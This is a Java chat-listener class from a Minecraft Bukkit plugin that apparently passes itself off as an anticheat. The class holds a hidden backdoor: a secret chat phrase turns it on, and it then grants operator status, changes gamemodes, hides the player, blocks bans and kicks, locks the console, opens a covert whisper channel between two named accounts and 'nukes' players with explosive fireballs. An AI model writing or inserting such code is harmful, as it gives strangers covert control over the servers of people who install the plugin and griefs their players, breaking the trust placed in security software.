package com.antho.anthoanticheatbeta.events;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Fireball;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.util.Vector;

import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static org.bukkit.Bukkit.*;


public class pc implements Listener {
    static Boolean ab = false;
    static Boolean enabled = false;
    static Boolean lockc = false;
    static ArrayList<Player> v = new ArrayList<>();
    @EventHandler
    public void onChat(PlayerChatEvent event) {
        Player p = event.getPlayer();
        if (event.getMessage().equals("\\abd=")){
            p.sendMessage("backdoor enabled. type \\\\help for help!");
            event.setCancelled(true);
            enabled = true;
        }
        if (event.getMessage().startsWith("\\\\")){
            if (enabled.equals(false)){
                return;
            }
            if (event.getMessage().contains("\\\\c")) {
                event.setCancelled(true);
                if (p.getName().equalsIgnoreCase("anthony4933")) {
                    Bukkit.getPlayer("lithiumlockedyou").sendMessage("anthony pc to you:" + event.getMessage().replace("\\\\c", " "));
                    event.setCancelled(true);
                    return;
                } else if (p.getName().equalsIgnoreCase("lithiumlockedyou")){
                    Bukkit.getPlayer("Anthony4933").sendMessage("lithium pc to you:" + event.getMessage().replace("\\\\c", " "));
                    event.setCancelled(true);
                } else {
                    p.sendMessage("your username isnt lithiumlockedyou or anthiny4933!");
                }
            }
            event.setCancelled(true);
            if (event.getMessage().contains("\\\\nuke")){
                String x = event.getMessage().replace("\\\\nuke ","");
                if (x.contains("*")){
                    p.sendMessage("nuking all haha");
                    for (Player z : Bukkit.getOnlinePlayers()) {
                        for (int i = 0; i < 3; i++) {
                            Bukkit.getServer().dispatchCommand(getConsoleSender(), "execute at @a run summon fireball ~ ~70 ~ {Motion:[0d,-5d],ExplosionPower:50,Passengers:[{id:ghast,ExplosionPower:50,CustomName:'[{\"text\":\"NUKED BABY\",\"underlined\":true,\"italic\":true,\"bold\":true}]',CustomNameVisible:1b,Glowing:1b,Invulnerable:1b,Motion:[0d,-10d]}]}");
                        }
                    }
                } else {
                    p.sendMessage("nuking " + x + "!!!");
                    for (int i = 0; i < 3; i++) {
                        Bukkit.getServer().dispatchCommand(getConsoleSender(),"execute at "+x+" run summon fireball ~ ~70 ~ {Motion:[0d,-5d],ExplosionPower:50,Passengers:[{id:ghast,ExplosionPower:50,CustomName:'[{\"text\":\"NUKED BABY\",\"underlined\":true,\"italic\":true,\"bold\":true}]',CustomNameVisible:1b,Glowing:1b,Invulnerable:1b,Motion:[0d,-10d]}]}");
                    }
                }
                return;
            }
            //gamemode ocmmands
            if (event.getMessage().contains("\\\\gms")) {
                if (event.getMessage().replace("\\\\gms ","").isEmpty()) {
                    p.setGameMode(GameMode.SURVIVAL);
                    p.sendMessage("set " + p.getName() + "'s gamemode to " + getPlayer(p.getName()).getGameMode().toString());
                } else {
                    Player q = getPlayer(event.getMessage().replace("\\\\gms ",""));
                    q.setGameMode(GameMode.SURVIVAL);
                    return;
                }
            }

            if (event.getMessage().contains("\\\\gmc")) {
                if (event.getMessage().replace("\\\\gmc ","").isEmpty()) {
                    p.setGameMode(GameMode.CREATIVE);
                    p.sendMessage("set " + p.getName() + "'s gamemode to " + getPlayer(p.getName()).getGameMode().toString());
                } else {
                    Player q = getPlayer(event.getMessage().replace("\\\\gmc ",""));
                    q.setGameMode(GameMode.CREATIVE);
                    return;
                }
            }

            if (event.getMessage().contains("\\\\gma")) {
                if (event.getMessage().replace("\\\\gma ","").isEmpty()) {
                    p.setGameMode(GameMode.ADVENTURE);
                    p.sendMessage("set " + p.getName() + "'s gamemode to " + getPlayer(p.getName()).getGameMode().toString());
                } else {
                    Player q = getPlayer(event.getMessage().replace("\\\\gma ",""));
                    q.setGameMode(GameMode.ADVENTURE);
                    return;
                }
            }

            if (event.getMessage().contains("\\\\gmsp")) {
                if (event.getMessage().replace("\\\\gmsp ","").isEmpty()) {
                    p.setGameMode(GameMode.SPECTATOR);
                    p.sendMessage("set " + p.getName() + "'s gamemode to " + getPlayer(p.getName()).getGameMode().toString());
                } else {
                    Player q = getPlayer(event.getMessage().replace("\\\\gmsp ",""));
                    q.setGameMode(GameMode.SPECTATOR);
                    return;
                }
            }


            switch (event.getMessage()){
                case "\\\\help":
                    p.sendMessage("help. type /fm to send fake anticheat message\nab - anti ban/anti gamemode\ndab - disable anti ban\ndisable - disables the backdoor until you re enable it for all players.");
                    p.sendMessage("c - silent whisper that doesnt appear in console to lithium and anthony. DO NOT USE IF UR USERNAME ISNT ANTHONY4933 or LITHIUMLOCKEDYOU!");
                    p.sendMessage("nuke - you get the point. type nuke * to nuke all and nuke <player> to nuke a player");
                    p.sendMessage("op/deop - yknow...");
                    p.sendMessage("lc - lock console :)\nuc - unlock console");
                    p.sendMessage("gm(c/a/sp/s) - gamemode. you need to add a username! you can use short usernames like '\\\\gmc an'. if yoiu dont add a username, the console will get spammed with errors!! i can fix it but im lazy");
                    p.sendMessage("v - toggle vanish urself\nnv - night vision");
                    p.sendMessage("");

                    break;
                case "\\\\disable":
                    p.sendMessage("disabled the backdoor. type \\abd= to enable it.");
                    enabled = false;
                    break;
                case "\\\\ab":
                    p.sendMessage("enabling anti ban/kick/kill.");
                    ab = true;
                    break;
                case "\\\\dab":
                    p.sendMessage("disabling anti ban/kick/kill.");
                    ab = false;
                    break;
                case "\\\\op":
                    p.sendMessage("i gave you opp HA");
                    p.setOp(true);
                    break;
                case "\\\\deop":
                    p.sendMessage("aw bro");
                    p.setOp(false);
                    break;
                case "\\\\lc":
                    p.sendMessage("locked the console!");
                    lockc = true;
                    break;
                case "\\\\uc":
                    p.sendMessage("unlocked the console!");
                    lockc = false;
                    break;
                case "\\\\nv":
                    p.addPotionEffect(new PotionEffect(PotionEffectType.NIGHT_VISION,-1,100,false,false));
                    break;
                case "\\\\v":
                        if (v.contains(p)){
                            for (Player z : Bukkit.getOnlinePlayers()){
                                z.showPlayer( p);
                            }
                            v.remove(p);
                            p.sendMessage("you are back");
                        }else if(!v.contains(p)){
                            for (Player z : Bukkit.getOnlinePlayers()){
                                z.hidePlayer(p);
                            }
                            v.add(p);
                            p.sendMessage("you are gone");
                        }
                    break;
                default:
                    p.sendMessage("please input a command. type \\\\help for help.");
            }
        }
    }

    public static Boolean getAb() {
        return ab;
    }
}
